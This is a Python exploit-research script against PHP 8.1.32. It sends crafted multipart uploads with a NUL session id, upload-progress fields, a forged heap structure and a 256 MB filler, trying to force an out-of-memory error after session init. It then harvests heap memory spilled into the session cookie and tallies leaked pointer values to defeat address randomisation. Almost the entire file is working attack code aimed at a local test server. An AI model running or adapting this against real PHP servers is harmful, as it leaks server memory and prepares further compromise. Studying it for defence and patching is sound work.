#!/usr/bin/env python3
"""8.1.32 (18110) NUL-sid + after-session-init OOM attempt.
dinosn insight: OOM must land AFTER session init (inside php_url_encode) so
send_cookie=1. On 8.1.32 the cookie channel is already OPEN (32B clean for any
sid), so this is the best sub-8.3 target. Test NUL sid + several OOM shapes to
see if ANY produces a heap-spill (>32B) cookie.
"""
import os
import struct, sys, time, collections
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "test", "poc8335"))
import exploit as E

HOST = "127.0.0.1"; PORT = 18110

def votes(raw):
    c = collections.Counter()
    for i in range(0, len(raw)-8, 8):
        v = int.from_bytes(raw[i:i+8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    return c.most_common(2)

def oom_big(t, mb=256):
    parts = [{"name": "p%04d" % i, "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (mb*1024*1024)},
    ]
    t.post(E.build_multipart(parts, b"S"*17), b"S"*17, read_cap=1<<20, timeout=120)

def read(t, sid):
    parts = [
        {"name": "PHPSESSID", "data": sid},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(841):
        parts.append({"name": str(1000+i), "data": (f"v{i:04d}"+"x"*44)[:48].encode()})
    forge = bytearray(b"A"*79); struct.pack_into("<Q", forge, 0x10, 0x1000); forge[0x18]=ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    resp = t.post(E.build_multipart(parts, b"B"*10), b"B"*10, read_cap=9<<20)
    raw = E.parse_cookie(resp)
    return raw, votes(raw)

def main():
    t = E.Target(f"http://{HOST}:{PORT}/", timeout=30, verbose=False)
    sids = [b"\x00", b"a", b"a"*19, b"a"*32, b"a"*48, b"a"*128, b"\x00"*32]
    for sid in sids:
        oom_big(t)
        time.sleep(0.15)
        raw, v = read(t, sid)
        spill = len(raw) > 64
        tag = "SPILL" if spill else ("clean" if raw else "no-cookie")
        isnull = "NUL " if (len(sid) == 1 and sid == b"\x00") else ""
        print(f"[sid={len(sid):3d}B {isnull}] cookie_len={len(raw):5d} "
              f"heap={any(x>=8 for _,x in v)} {tag}", flush=True)

if __name__ == "__main__":
    main()
